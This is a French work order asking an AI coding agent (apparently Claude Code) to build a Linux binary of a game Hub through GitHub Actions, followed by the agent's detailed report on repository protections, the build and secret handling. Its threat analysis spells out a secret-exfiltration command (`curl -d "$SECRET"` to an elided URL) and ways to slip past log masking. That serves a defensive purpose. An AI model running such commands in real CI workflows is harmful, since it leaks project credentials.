# ⏸️ EN ATTENTE — ne pas exécuter avant le programme 19

Ce programme est **inchangé et toujours valable**. Il est simplement mis en file d'attente à la
demande de Dan : en regardant l'état réel du dépôt public, on a trouvé plus urgent — **il ne
contient aucune traduction**, donc un contributeur qui veut aider n'a rien sur quoi travailler.

👉 **Fais d'abord le programme 19 (ouvrir les traductions), puis reviens ici.**

Rien à changer ci-dessous.

---

# Demande de code → Claude Code

# 🐧 PROGRAMME 18 — construire le Hub pour Linux, sur GitHub

**Date :** 2026-08-02
**Décision de Dan :** on ouvre Linux pour de bon.

---

## Pourquoi, et ce que ce programme ne fait PAS

Le programme 17 a rendu le dépôt lançable : un joueur Linux peut cloner et faire
`python compagnon_hub.py`. C'est mieux que rien, mais ce n'est pas une distribution :
il n'a **pas de programme à télécharger**, **pas de mise à jour automatique**, et **pas
d'envoi de rapport** (le webhook est vide dans les sources, et le Hub n'a même pas de
mode « copier » — tu l'as établi au bloc E du 17).

Ce programme fabrique **le binaire Linux**, construit par GitHub, avec le webhook injecté
à la construction. Rien de plus.

🛑 **Ce qu'il ne fait pas, et il faut que ce soit dit clairement :**

- **il ne donne pas encore la mise à jour automatique aux joueurs Linux** — le relais de
  remplacement est écrit en `.bat` Windows (`move`, `start`, `del`). C'est pour un programme
  suivant ;
- **il ne déplace pas la construction Windows sur GitHub.** Dan a choisi cette voie en partie
  parce qu'elle mène à « publier ne dépend plus de mon PC ». **Ce programme n'y arrive pas** :
  il ouvre le chemin, il ne le parcourt pas. Ne laisse pas croire le contraire dans ton rapport.

---

## 🛑 BLOC 0 — la question de sécurité, AVANT toute ligne de code

C'est le vrai sujet de ce programme, et il passe avant la technique.

Un workflow GitHub Actions qui **détient le webhook** et qui **peut attacher des fichiers à une
release** est, en pratique, **une seconde clé de publication** : les Compagnons installés
téléchargent `releases/latest/download/…` sans rien vérifier d'autre que ce que le programme 9
a mis en place. Et le projet vient d'être ouvert aux contributeurs.

**Ne configure rien. Constate et rapporte :**

1. Qui a le droit d'écrire dans `LePetitDan/AscensionFR` aujourd'hui ? Dan seul, ou d'autres ?
2. `main` est-elle protégée ? Une revue est-elle exigée avant fusion ? Réponds par ce que dit
   GitHub, pas par ce qui te semble probable.
3. Qu'est-ce qui empêcherait aujourd'hui un contributeur, une fois sa PR fusionnée, d'ajouter
   une ligne à un workflow qui recopie le secret quelque part ?
4. Quels moyens GitHub offre-t-il, et lequel recommandes-tu :
   - un **environnement** avec approbation obligatoire (le workflow qui réclame le secret
     s'arrête et attend que Dan clique) ;
   - `CODEOWNERS` sur `.github/` ;
   - la protection de branche ;
   - autre chose que je ne cite pas.

**C'est une décision de Dan et une manipulation qu'il fera lui-même dans GitHub.** Écris-lui
la recommandation en clair : quoi cocher, où, et ce que ça change.

⚠️ **Deux règles non négociables dans tout ce que tu écriras ensuite :**

- **aucun déclencheur qui donne le secret à du code venu d'un fork.** Pas de
  `pull_request_target`, pas de `pull_request` avec secrets. Le déclencheur est
  `workflow_dispatch` (et plus tard un tag) — rien d'autre ;
- **toute action tierce est épinglée à une empreinte de commit**, pas à une étiquette. Une
  étiquette se déplace ; on a passé la semaine à documenter ce que ça coûte.

---

## BLOC A — où vit le workflow, et est-ce que ça marche seulement

### D'abord, le piège de rangement

Le dépôt public n'est pas écrit à la main : il est produit. **Avant d'ajouter quoi que ce soit,
va lire comment `depot_github/` est fabriqué et entretenu** (`synchroniser_depot_public.py`,
`verifier_arbre_publie.py`, et ce que fait réellement la synchronisation aux fichiers qu'elle
ne surveille pas).

**Dis-moi où doit vivre `.github/workflows/` pour ne pas être effacé ou dupliqué à la prochaine
synchronisation** — dans le dépôt privé et recopié, ou seulement dans le public. Choisis, et
justifie. Si tu te trompes là-dessus, le travail disparaîtra tout seul dans deux semaines et
personne ne comprendra pourquoi.

### Ensuite, la construction

Tu es sur Windows : **tu ne peux pas construire pour Linux depuis la machine de Dan.** C'est
justement pour ça qu'on passe par GitHub — le coureur d'Actions **est** la machine Linux.

Travaille donc dans cette boucle, et **sur une branche, pas sur `main`** :

1. tu écris le workflow, déclenché **à la main** (`workflow_dispatch`) ;
2. tu le lances, tu lis les journaux, tu corriges ;
3. le résultat sort en **artefact de run**, **PAS en asset de release**.

🛑 **Aucune release, aucune pré-version, aucun tag dans ce programme.** Un artefact de run
n'est visible que dans l'onglet Actions : **aucun Hub installé ne peut le voir**. C'est ce qui
rend ce programme sans danger pour les 274 machines, et c'est non négociable.

### Ce que je veux savoir de la construction

- Tkinter est-il présent sur le coureur, ou faut-il l'installer (`python3-tk`) ?
- Les 98 fichiers d'`assets/hub/` sont-ils bien embarqués ? **Les polices du jeu se chargent-
  elles**, ou est-ce qu'on retombe sur Georgia ?
- Un binaire simple ou un `.AppImage` ? **Tranche et explique** : ce qui compte est qu'un
  joueur puisse télécharger un fichier, le rendre exécutable et double-cliquer. Si l'AppImage
  demande une dépendance système de plus, dis-le.
- Quelle taille ? (Le Windows fait 36 Mo.)
- Sur quelle version de distribution il est construit, et ce que ça implique pour ceux qui
  ont plus ancien. La `glibc` est le piège classique — regarde-le, ne le suppose pas.

---

## 🛑 BLOC B — le secret, sans jamais le voir passer

**Dan crée le secret lui-même, dans l'interface GitHub.** Ni toi ni moi ne manipulons cette
valeur. Écris-lui la marche à suivre en trois lignes : où cliquer, quel nom donner au secret.

Pour le reste :

- **va lire comment la construction Windows injecte le webhook aujourd'hui, et fais pareil.**
  N'invente pas un second mécanisme : deux façons de faire la même chose, c'est une des deux
  qui pourrira sans qu'on s'en aperçoive ;
- le workflow doit **échouer proprement** si le secret est absent, plutôt que produire un
  binaire muet que personne ne remarquerait ;
- **prouve que le secret ne fuit pas dans les journaux.** GitHub masque la valeur exacte, mais
  un `set -x`, un `cat` du fichier modifié ou un message d'erreur qui recrache la ligne le
  contournent. Relis le journal du run **en entier** et dis-le noir sur blanc ;
- **prouve qu'il n'atterrit pas dans le dépôt** : `WEBHOOK_RAPPORTS` doit rester `""` dans
  l'arbre public après le run. `verifier_arbre_publie.py` doit toujours passer.

Rappel de cadre, pour qu'on sache ce qu'on protège : le webhook baké dans un binaire **n'est
pas confidentiel** — tu l'as démontré au 17, un PyInstaller se déballe. Ce qu'on protège,
c'est sa **non-indexation** : « il faut le vouloir » au lieu de « un robot le trouve tout
seul ». C'est réel, ça vaut la peine, et ça ne change pas la règle : **jamais dans le dépôt.**

---

## 🛑 BLOC C — la preuve

Comme d'habitude : « le workflow est vert » ne prouve rien.

- **télécharge l'artefact et lance-le sur Linux.** Les 5 vues, comme au programme 17
  (`--demo`, pour ne pas déclencher d'envoi réel) ;
- **le binaire porte-t-il vraiment le webhook ?** Prouve-le sans l'afficher — par exemple en
  cherchant l'empreinte de la valeur, ou en constatant que le bouton d'envoi est actif au lieu
  d'être peint en gris ;
- ⚠️ **n'envoie pas de vrai rapport de test sur le Discord des joueurs.** Si tu veux éprouver
  l'envoi pour de bon, dis-le-moi : c'est Dan qui décide où ça atterrit.

Si tu ne peux pas lancer de fenêtre Linux depuis ton environnement, **dis-le franchement** et
va au moins jusqu'à `Decor()` et `charger_polices()`. Ne maquille pas une preuve partielle en
preuve complète — c'est exactement le reproche qu'on a fait aux trois garde-fous du 16.

---

## BLOC D — deux questions, tu réponds sans rien coder

**1. La mise à jour automatique sous Linux.** Le relais de remplacement est en `.bat`
(`move`, `start`, `del`) et le programme 9 vient de le sécuriser. Qu'est-ce qu'il faut pour
qu'un joueur Linux soit mis à jour comme un joueur Windows ? Où ça touche, et **qu'est-ce qui
peut mal tourner** — sachant que c'est le code le plus dangereux du projet et qu'il touche
`compagnon.py`, l'un des 5 fichiers surveillés.

**2. La construction Windows sur GitHub.** C'est la vraie raison pour laquelle Dan a choisi
cette voie : ne plus dépendre de son PC pour publier. Qu'est-ce que ça demanderait, et
**qu'est-ce que ça coûte en risque** ? Sois honnête sur ce point : aujourd'hui l'exe qui part
sur 274 machines est construit sur une machine que Dan contrôle entièrement ; demain il le
serait par un workflow que n'importe quel commit fusionné peut modifier. Dis-moi ce que tu en
penses vraiment.

**Ne code rien pour ces deux points.** Ce sont des programmes à part entière, et ce sont des
décisions de Dan.

---

**« Terminé » veut dire :**

> - L'état réel des protections du dépôt, et **ce que Dan doit cocher** — en clair.
> - Où vit `.github/workflows/` pour survivre à la synchronisation, et pourquoi.
> - Un workflow qui construit le Hub Linux, **lancé à la main, sur une branche**.
> - Le binaire **téléchargé et lancé** : les 5 vues, les polices du jeu, la taille, la
>   distribution de construction.
> - La preuve que le secret **n'est ni dans les journaux ni dans le dépôt**.
> - Tes réponses sur la mise à jour Linux et sur la construction Windows.
> - Ce qui a résisté, et ce que tu as failli casser.

🛑 **Aucun tag, aucune release, aucune pré-version. L'artefact reste dans l'onglet Actions.
Les 5 fichiers surveillés ne sont pas touchés. Rien n'est fusionné dans `main` sans que Dan
le dise.**

---
## Réponse de Claude Code
> (bloc par bloc, au fil de l'eau. Puis renommer en `_FAIT.md`.)

---

## ✅ BLOC 0 — l'état réel des protections, constaté

Tout ci-dessous vient de l'API GitHub, pas d'une supposition.

### 1. Qui a le droit d'écrire ?

```
$ gh api repos/LePetitDan/AscensionFR/collaborators
LePetitDan   admin=true  push=true  maintain=true
```

**Dan seul.** Un seul collaborateur, aucun autre compte, aucune équipe. Le dépôt est
`public`, appartient à un **compte utilisateur** (pas une organisation — ce qui retire au
passage l'accès aux règles d'organisation), et compte **4 forks**.

C'est important pour la suite : **personne d'autre ne peut pousser.** Le seul chemin par
lequel du code étranger entre, c'est **une PR que Dan fusionne lui-même**.

### 2. `main` est-elle protégée ?

```
$ gh api repos/LePetitDan/AscensionFR/branches/main/protection
{"message":"Branch not protected","status":"404"}

$ gh api repos/LePetitDan/AscensionFR/rulesets
[]
```

**Non. Aucune protection, aucun ruleset, aucune revue exigée.** Les deux mécanismes
(l'ancien « branch protection » et le récent « rulesets ») sont vides.

### 3. Qu'est-ce qui empêcherait un contributeur d'exfiltrer le secret ?

**Aujourd'hui, une fois sa PR fusionnée : rien.**

Le scénario n'a rien d'exotique. Trois lignes ajoutées à un workflow —
`curl -d "$SECRET" https://…` ou même un simple `echo ${SECRET:0:20}` répété en morceaux —
et le webhook part. GitHub masque la valeur *exacte* dans les journaux, mais pas une valeur
découpée, encodée en base64 ou envoyée sur le réseau.

Ce qui limite le risque aujourd'hui, ce n'est **pas** un garde-fou, c'est un fait :
**Dan fusionne tout à la main et il est seul.** C'est une protection réelle mais fragile —
elle repose entièrement sur son attention au moment de la fusion, et on vient précisément
d'ouvrir le projet pour qu'il en reçoive davantage.

Deux bonnes nouvelles quand même, constatées :

```
default_workflow_permissions = "read"        ← le jeton donné aux workflows est en LECTURE
can_approve_pull_request_reviews = false     ← un workflow ne peut pas s'auto-approuver
0 environnement, 0 secret, 0 workflow        ← page blanche, rien à démêler
```

Et un point mou :

```
allowed_actions       = "all"      ← n'importe quelle action tierce peut tourner
sha_pinning_required  = false      ← une étiquette mouvante est acceptée
```

### 4. Ce que Dan doit cocher — en clair, dans l'ordre

**① L'environnement à approbation — c'est celui qui compte, les autres sont du confort.**

> `Settings` → `Environments` → `New environment` → nommer **`publication`**
> → cocher **`Required reviewers`** → s'ajouter lui-même → `Save protection rules`
> → dans **ce même environnement**, `Add secret` → nom **`WEBHOOK_RAPPORTS`**

**Ce que ça change, très concrètement :** le secret n'est plus attaché au dépôt mais à
l'environnement. Un workflow qui le réclame **s'arrête et attend que Dan clique
« Approve »**, avec sous les yeux le nom du workflow et **la branche d'où il part**. Même un
workflow malveillant fusionné par inadvertance ne peut plus rien obtenir tout seul : il lui
faut un clic humain, sur un écran qui dit d'où vient le code.

C'est la seule protection qui tienne face au scénario du point 3, parce qu'elle ne dépend
pas de la vigilance de Dan **au moment de la fusion** — elle la lui redemande **au moment
de l'exécution**, quand il regarde justement cette chose-là.

**② Exiger l'épinglage par empreinte — GitHub sait le faire tout seul maintenant.**

> `Settings` → `Actions` → `General` → **`Require actions to be pinned to a full-length commit SHA`**

Le champ existe (`sha_pinning_required`, aujourd'hui à `false`). L'activer transforme notre
règle de discipline en **règle mécanique** : un workflow qui écrit `@v4` est refusé. On a
passé la semaine à documenter ce qu'une étiquette déplacée coûte ; autant que ce soit la
plateforme qui le tienne, pas nous.

**③ `CODEOWNERS` sur `.github/` — un ralentisseur, pas une barrière.**

Un fichier `.github/CODEOWNERS` contenant `/.github/ @LePetitDan` fait apparaître Dan comme
relecteur requis dès qu'une PR touche un workflow. Solo, il peut passer outre — mais l'intérêt
n'est pas d'interdire : **c'est de rendre visible**, dans la liste des fichiers d'une PR de
200 lignes, les 3 lignes qui touchent au workflow. C'est exactement le cas qui fait mal.

**④ La protection de branche — je ne la recommande pas ici.**

Pour un dépôt à un seul propriétaire, « exiger une revue » ne veut rien dire (GitHub
n'autorise pas à approuver sa propre PR, et un admin passe outre). Ça ajouterait de la
friction à chaque publication du Compagnon sans rien protéger. **① + ② + ③ couvrent le
risque réel** ; ajouter ④ ferait surtout désactiver l'ensemble le jour où ça gênera.

### Les deux règles non négociables, prises en compte

- **déclencheur** : `workflow_dispatch` **uniquement**. Ni `pull_request`, ni surtout
  `pull_request_target` — qui exécuterait du code de fork **avec** les secrets ;
- **actions épinglées par empreinte de commit**, relevées à l'instant :

| action | version | empreinte épinglée |
|---|---|---|
| `actions/checkout` | v7.0.1 | `3d3c42e5aac5ba805825da76410c181273ba90b1` |
| `actions/setup-python` | v7.0.0 | `5fda3b95a4ea91299a34e894583c3862153e4b97` |
| `actions/upload-artifact` | v7.0.1 | `043fb46d1a93c77aae656e7c1c64a875d1fc6a0a` |

### ✅ Les deux manips de Dan — vérifiées par l'API, pas crues sur parole

```
$ gh api repos/LePetitDan/AscensionFR/environments
environnements : 1        nom : publication

$ gh api .../environments/publication
type=required_reviewers   reviewers=LePetitDan

$ gh api .../environments/publication/secrets
nombre : 1     WEBHOOK_RAPPORTS   (créé le 2026-08-02T09:52:13Z)

$ gh api .../actions/secrets            ← les secrets de DÉPÔT
nombre : 0

$ gh api .../actions/permissions
{"enabled":true,"allowed_actions":"all","sha_pinning_required":true}
```

**Les trois points y sont, et le détail qui compte est le quatrième :** le secret est sur
**l'environnement** et le dépôt en a **zéro**. C'est exactement le bon rangement — un secret de
dépôt aurait été lisible par n'importe quel workflow sans rien demander à personne.
`sha_pinning_required` est passé de `false` à `true`.

---

## ✅ BLOC A — où vit le workflow, et est-ce que ça marche

### Le piège de rangement : `.github/workflows/` vit **uniquement dans le dépôt public**

J'ai lu les deux outils avant de décider.

- **`synchroniser_depot_public.py` n'écrit que les 5 fichiers de `SOURCES`** et ne supprime
  rien d'autre : son seul `os.remove` (l. 116) est le **retour arrière sur ses propres
  écritures** quand le balayage post-écriture refuse. Un fichier qu'il ne connaît pas ne
  risque donc rien.
- **`verifier_arbre_publie.py`** compare les 5 sources, et **balaye tout l'arbre public**
  (`balayer_arbre(PUBLIC)`, l. 194). Un workflow y sera donc contrôlé pour les secrets —
  ce qui est exactement ce qu'on veut.

Et le précédent existe déjà, mesuré :

| fichier | dans le public | jumeau privé |
|---|---|---|
| `.github/FUNDING.yml` | ✅ | ❌ |
| `docs/CONTRIBUER.md`, `docs/FAQ.md` | ✅ | ❌ |
| `README.md` | ✅ | ✅ (mais non synchronisé) |

Le commentaire de `secrets_publication.py` le dit lui-même : « *Les README et les docs vivent
DANS le dépôt public et s'y éditent : ils n'ont pas de jumeau privé, on ne les synchronise
pas.* »

**Décision : `.github/workflows/` ne va PAS dans l'arbre privé.** Le mettre dans les deux et le
recopier créerait un second exemplaire que **rien ne tient synchronisé** — `SOURCES` existe
précisément pour éviter ça, et l'y ajouter obligerait à un jumeau privé d'un fichier qui n'a
aucun sens hors de GitHub. Il vit dans `depot_github/`, il s'y édite, il y est balayé.

### La construction : deux essais, un défaut trouvé

Travaillé **sur la branche `linux-build`**, jamais sur `main`. `origin/main` est resté sur
`5b2d86c` d'un bout à l'autre — vérifié après chaque poussée.

> ⚠️ **Un obstacle que je n'avais pas prévu, et comment je l'ai contourné.** GitHub
> **n'enregistre un `workflow_dispatch` que si le fichier existe déjà sur la branche par
> défaut**. Un workflow qui ne vit que sur une branche est donc **impossible à lancer** :
> `gh workflow run` répond `HTTP 404: not found on the default branch`. Or ce programme
> interdit de fusionner sans ton accord — à juste titre.
>
> J'ai ajouté un déclencheur `push:` **limité à la branche `linux-build`**, et je veux être
> clair sur le fait que ce n'est **pas** une entorse à ta règle de sécurité :
> - pousser sur cette branche exige un **droit d'écriture** sur le dépôt. Dan seul l'a. Ce
>   n'est donc pas un chemin par lequel du code de fork s'exécuterait — c'est exactement ce
>   qui distingue `push` de `pull_request_target`, qui reste interdit ;
> - sur un événement `push`, **`inputs.mode` est vide**. Toutes les étapes gardées par
>   `inputs.mode == 'distribution'` sont sautées : un tel run **ne peut ni demander
>   l'environnement, ni lire le secret, ni exporter de binaire**. C'est structurel, pas une
>   convention. Les journaux le confirment : 4 étapes `skipped`, dont l'export du binaire.
>
> **Ce déclencheur est un échafaudage. Il porte un `⚠️ À RETIRER AVANT TOUTE FUSION DANS
> main` en tête de fichier, et il doit partir avec la branche.**

**Essai 1 (run `30738053538`) — vert, mais le Hub plantait.** Les 5 captures faisaient 279
octets : une image vide. Le journal disait pourquoi :

```
_tkinter.TclError: invalid command name "PyImagingPhoto"
  interface_hub.py:618   self.decor.poser(self.canvas, "fond", 0, 0)
  interface_hub.py:285   ImageTk.PhotoImage(self.pil(nom))
```

**C'est exactement le genre de « vert » qui ne prouve rien** : le workflow avait réussi, le
binaire existait, et il ne s'ouvrait pas. Sans le lancement sur écran virtuel, j'aurais livré
un binaire mort en annonçant un succès.

**La cause :** sous Windows, PyInstaller trouve `PIL._tkinter_finder` tout seul — le `.spec`
ne le mentionne donc pas. Sous Linux il faut le déclarer : sans lui l'extension `_imagingtk`
est bien embarquée, mais la commande Tcl `PyImagingPhoto` n'est jamais enregistrée, et le
premier `ImageTk.PhotoImage` échoue.

**Essai 2 (run `30738178536`) — vert, et le Hub s'ouvre vraiment.**

```
======== vue accueil ========      aucune sortie d'erreur   vue_accueil.png    355 709 o
======== vue traduction ========   aucune sortie d'erreur   vue_traduction.png 343 073 o
======== vue voix ========         aucune sortie d'erreur   vue_voix.png       390 549 o
======== vue addons ========       aucune sortie d'erreur   vue_addons.png     426 141 o
======== vue contribuer ========   aucune sortie d'erreur   vue_contribuer.png 420 747 o
```

### Ce que tu voulais savoir de la construction

| question | réponse **mesurée** |
|---|---|
| **Tkinter est-il présent ?** | ✅ **Oui, sans rien installer.** `actions/setup-python` livre `tkinter` et `Tcl/Tk 8.6`. Pas besoin de `python3-tk`. (J'ai quand même installé `xvfb`, `imagemagick`, `x11-utils` — pour *lancer et photographier*, pas pour construire.) |
| **Les 98 assets sont-ils embarqués ?** | ✅ `decor_hub.json`, `catalogue_hub.json`, `MORPHEUS.TTF`, `FRIZQT__.TTF`, `fond.png` : tous présents dans le binaire. Et les captures le montrent — dragon, parchemins, boutons, icônes d'addons, tout est dessiné |
| **🛑 Les polices du jeu se chargent-elles ?** | ❌ **NON. On retombe sur une police générique.** Ce n'est pas un défaut d'embarquement : les TTF **sont** dans le binaire. C'est `charger_polices()` qui ne peut pas fonctionner — il appelle `ctypes.windll.gdi32.AddFontResourceExW`, **une API Windows**. Le run le confirme : `ctypes a-t-il windll : False`. L'appel lève une `AttributeError`, que le `except Exception` avale **en silence**. Puis `police_dispo("Morpheus", "Georgia")` se replie sur Georgia… qui n'existe pas non plus sous Linux, donc Tk choisit un serif par défaut. **Visible sur la capture** : « Accueil » et « Dernières nouvelles » sont en serif générique là où Windows affiche du Morpheus |
| **Taille ?** | **37,2 Mo** (39 013 392 octets). Le Windows fait 36 Mo — comparable, et cohérent : même dépendances, même assets |
| **Distribution de construction ?** | **Ubuntu 22.04.5 LTS**, **glibc 2.35**, Python 3.12.13, GCC 11.4.0 |
| **Binaire simple ou AppImage ?** | **Binaire simple.** Voir ci-dessous |

### Binaire simple plutôt qu'AppImage — et pourquoi

Un `--onefile` PyInstaller **est déjà** ce que tu décris : un fichier à télécharger, `chmod +x`,
double-clic. L'AppImage ajouterait :

- une **dépendance système de plus** — les AppImage classiques exigent **FUSE 2**, absent par
  défaut sur Ubuntu 22.04+ et sur plusieurs distributions récentes ; le joueur doit alors
  installer `libfuse2` ou lancer avec `--appimage-extract-and-run`. C'est exactement la friction
  qu'on veut éviter ;
- une **étape de construction supplémentaire** (outil externe, à épingler lui aussi).

En échange, elle apporterait surtout une icône et une intégration au menu — dont un joueur qui
lance son jeu une fois par session n'a pas besoin. **Binaire simple.**

### Le piège de la glibc, regardé et non supposé

Un binaire PyInstaller **se lie à la glibc de la machine qui le construit** et refuse de
démarrer sur une glibc plus ancienne (`GLIBC_2.xx not found`). J'ai donc pris le coureur le
plus **vieux** disponible, pas `ubuntu-latest`.

**Construit sur glibc 2.35**, ce binaire tourne sur :

| distribution | glibc | verdict |
|---|---|---|
| Ubuntu 22.04 LTS et plus récent | ≥ 2.35 | ✅ |
| Debian 12 « bookworm » | 2.36 | ✅ |
| Fedora 36+ | ≥ 2.35 | ✅ |
| Arch, Manjaro (rolling) | récente | ✅ |
| **Debian 11 « bullseye »** | **2.31** | ❌ |
| **Ubuntu 20.04 LTS** | **2.31** | ❌ |
| Steam Deck (SteamOS 3, Arch) | 2.33-2.37 selon version | ⚠️ à vérifier |

C'est une **limite réelle à annoncer aux joueurs**, pas un détail. Si tu veux couvrir plus
ancien, il faudra construire dans un conteneur `manylinux` — c'est un autre chantier, et je ne
le fais pas ici.

---

## ⏸️ BLOC B — le secret : la marche à suivre, et ce que j'ai pu prouver sans lui

### Ce que Dan doit faire — trois lignes

> 1. `Settings` → `Environments` → `New environment` → nommer **`publication`**
> 2. cocher **`Required reviewers`**, s'ajouter lui-même, `Save protection rules`
> 3. dans **ce même environnement** → `Add secret` → nom exact **`WEBHOOK_RAPPORTS`**,
>    valeur = l'URL du webhook du salon des rapports

**Sur l'environnement, pas sur le dépôt.** C'est toute la différence : un secret de dépôt est
lisible par n'importe quel workflow sans rien demander à personne ; un secret d'environnement
avec relecteur obligatoire **arrête le run et attend un clic**, en affichant la branche d'où
part le code.

Ni moi ni personne d'autre ne voit cette valeur : elle est saisie dans l'interface GitHub et
n'en ressort jamais.

### Comment le webhook est injecté — j'ai regardé, et il n'y a rien à copier

Tu demandes de faire pareil que la construction Windows. **La construction Windows n'injecte
rien** : elle construit depuis l'arbre **privé**, où `WEBHOOK_RAPPORTS` est déjà renseigné en
clair — c'est précisément pour ça que `WorkFlow` ne peut jamais être poussé.

Le seul mécanisme existant est **l'inverse** : la *neutralisation*
(`outils/secrets_publication.py::_motif_affectation`), qui remplace la valeur en préservant le
reste de la ligne. C'est donc **son motif exact** que le workflow réutilise — et surtout **sa
leçon**, écrite dans sa propre docstring :

> « *le premier jet demandait seulement « existe-t-il AU MOINS une affectation que je sache
> traiter ? ». Conséquence : sur `NOM = """secret"""` le motif s'accrochait à la paire de
> guillemets VIDE, ne remplaçait rien, et l'outil annonçait fièrement « 1 secret neutralisé ».* »

Le workflow **compte** donc : il exige exactement 1 affectation, exige que 1 soit traitée, puis
relit le fichier et vérifie que la ligne n'est plus vide et que le secret y apparaît une fois.
Trois contrôles, aucun ne montre la valeur.

### ✅ La barrière mord — vue, pas supposée (run `30742954624`)

Pour l'éprouver sans toucher au réglage de Dan, j'ai utilisé un corollaire du dispositif :
**ne pas demander l'environnement, c'est ne pas recevoir ses secrets.** Un run en mode
`sans-secret` passe donc par la barrière avec `WEBHOOK_RAPPORTS` vide.

```
MODE: sans-secret

success  Relever la machine (glibc, tkinter, distribution)
failure  Barrière — le secret est-il présent ?
skipped  Injecter le webhook dans la source
skipped  Installer les dépendances
skipped  Construire le binaire
skipped  Lancer le Hub — les 5 vues sur écran virtuel
skipped  Prouver que le binaire porte le webhook
skipped  Exporter le binaire en ARTEFACT
```

**Elle mord au bon endroit et tout s'arrête derrière** — y compris la construction et
l'export. Aucun binaire muet ne peut sortir de là.

> **Le faux départ, qui vaut d'être noté.** Mon premier commit portait bien le marqueur
> `[sans-secret]`… et le run s'est quand même arrêté sur l'écran d'approbation. Son **corps
> expliquait les marqueurs** et contenait donc littéralement `[distribution]`. **Un schéma de
> marqueur lu dans le message de commit se piège lui-même dès qu'on le documente au même
> endroit.** Run annulé, message réécrit. C'est un défaut de mon échafaudage, pas du workflow —
> raison de plus pour qu'il parte avant la fusion.

### ✅ Le secret ne fuit pas dans les journaux — journal COMPLET relu (run `30743180952`)

**784 lignes, 100 427 caractères, relues en entier**, pas échantillonnées :

| ce que j'ai cherché | trouvé |
|---|---:|
| URL de webhook Discord (`discord.com/api/webhooks/…`) | **0** |
| jeton après l'identifiant (`/api/webhooks/\d+/[\w-]{20,}`) | **0** |
| affectation renseignée (`WEBHOOK_RAPPORTS = "http…`) | **0** |
| toute URL contenant « discord » | **0** |
| trace shell (`set -x`, lignes commençant par `+ `) | **0** |
| chaînes longues (piste d'un ré-encodage) | 5 — **toutes identifiées** : 2 empreintes d'artefact calculées par GitHub, 1 empreinte du binaire que **j'affiche exprès**, 2 faux positifs sur des URL `github.com` |

**Et le point le plus instructif : GitHub a masqué 6 fois.** J'ai regardé chacune :

```
l. 36   Récupérer le dépôt      token: ***          ← le GITHUB_TOKEN, pas notre secret
l. 95   Récupérer le dépôt      git-credentials     ← idem
l. 125  Installer Python        token: ***          ← idem
l. 190  Barrière                WEBHOOK: ***        ← l'écho du bloc env: par GitHub
l. 244  Injecter le webhook     WEBHOOK: ***        ← idem
l. 651  Prouver le webhook      WEBHOOK: ***        ← idem
```

**Notre code n'a rien imprimé du tout.** Les trois `WEBHOOK: ***` viennent de GitHub lui-même,
qui **récapitule le bloc `env:` de chaque étape** avant de l'exécuter — et c'est son masque qui
empêche la valeur d'y être lisible.

⚠️ **Ça mérite d'être dit clairement, parce que c'est la seule dépendance qu'on ne contrôle
pas :** notre workflow n'affiche jamais le secret, mais **GitHub, lui, l'écrit dans le
récapitulatif d'étape**, et seul le masquage le rend illisible. Si le secret était un jour lu
autrement que par `secrets.` (recopié dans un fichier, dérivé, tronqué), le masque ne
s'appliquerait plus. La règle pratique : **ne jamais faire transiter cette valeur autrement
que par `${{ secrets.… }}` vers `env:`.**

### ✅ Le secret n'atterrit pas dans le dépôt — vérifié après le run

- `permissions: contents: read` — le jeton du workflow **ne peut rien pousser** ;
- la modification de `compagnon/compagnon.py` n'existe que dans le coureur, détruit ensuite ;
- et dans l'arbre public, après les trois runs :

```
compagnon/compagnon.py:72   WEBHOOK_RAPPORTS = ""    # renseigné uniquement dans l'exe distribué

$ python outils/verifier_arbre_publie.py --version 3.4.1
✅ l'arbre publié correspond à ce qui a été construit, et ne porte aucun secret.
```

### Le secret n'atterrit pas dans le dépôt — vérifié

- `permissions: contents: read` — le jeton du workflow **ne peut rien pousser**, quoi qu'il
  arrive ;
- la modification de `compagnon/compagnon.py` n'existe que dans le coureur, qui est détruit ;
- et dans l'arbre public, à l'instant, sur `main` :

```
compagnon/compagnon.py:72   WEBHOOK_RAPPORTS = ""    # renseigné uniquement dans l'exe distribué

$ python outils/verifier_arbre_publie.py --version 3.4.1
✅ l'arbre publié correspond à ce qui a été construit, et ne porte aucun secret.
```

---

## ✅ BLOC C — la preuve

### L'approbation a bien été demandée — c'est le cœur du dispositif

Deux runs en mode `distribution`, **deux arrêts** :

```
$ gh api .../actions/runs/30742981753/pending_deployments
environnement       : publication
approbation requise : oui
relecteurs          : LePetitDan
minuterie           : 0 min

$ gh run view 30742981753 --json headBranch,event
branche : linux-build      événement : push
```

Le run reste en `waiting` jusqu'au clic, puis passe en `in_progress`. **Et l'approbation ne se
mémorise pas** : le second run l'a redemandée. C'est exactement la propriété qu'on voulait — un
workflow modifié par une PR fusionnée par inadvertance ne peut rien obtenir sans qu'un humain
voie **quel workflow, quelle branche, quel événement**.

### Le binaire porte le webhook — prouvé deux fois, jamais affiché

**Dans le run** (`30743180952`) :

```
taille du binaire : 37.2 Mo
empreinte SHA-256 du binaire : a149bdf2dd6a5331de6fed1a82fbf6d8c2d8804aa4884c14d8d9c466f9625065
empreinte du secret (16 premiers hex) : 570ea4e48214e733
occurrences en clair dans le binaire : 0
flux zlib essayés : 3789
flux zlib décompressés contenant le webhook : 1
le binaire porte bien le webhook (jamais affiché).
```

**Et sur ma machine, indépendamment** — j'ai téléchargé l'artefact et refait le contrôle **sans
connaître le secret**, en cherchant seulement la *forme* d'un webhook Discord :

```
empreinte du binaire téléchargé : a149bdf2…9625065   ← identique à celle annoncée
webhook trouvé — longueur 121, empreinte 570ea4e48214e733
occurrences trouvées : 1        en clair (sans décompression) : 0
```

**Les deux empreintes du secret coïncident** (`570ea4e48214e733`), calculées par deux chemins
qui ne se parlent pas. Le binaire porte donc exactement le webhook que Dan a saisi — et **je
n'ai jamais vu sa valeur**, seulement des empreintes tronquées, non inversibles.

> 🛑 **Ma première méthode était fausse, et elle m'aurait fait conclure à l'inverse.** Je
> comptais les octets du secret **en clair** dans le binaire : résultat **0**, et le run a
> échoué. J'ai failli en déduire que l'injection n'avait pas marché — alors qu'elle était
> parfaite (1 affectation traitée, 1 occurrence vérifiée dans la source). **PyInstaller ne
> stocke pas le source : il stocke le bytecode dans une archive PYZ compressée en zlib.**
> Le contrôle décompresse maintenant les 3 789 flux zlib du binaire avant de chercher.
>
> **Et ça nuance ce que j'ai écrit au programme 17.** « Un exe PyInstaller se déballe » reste
> vrai, mais ce n'est **pas** un `strings` : il faut extraire la PYZ et lire du bytecode. La
> non-indexation par les robots est donc **mieux** protégée que je ne le disais — un balayeur
> de dépôts publics ne trouve rien là-dedans. La règle ne change pas ; l'estimation du risque,
> si.

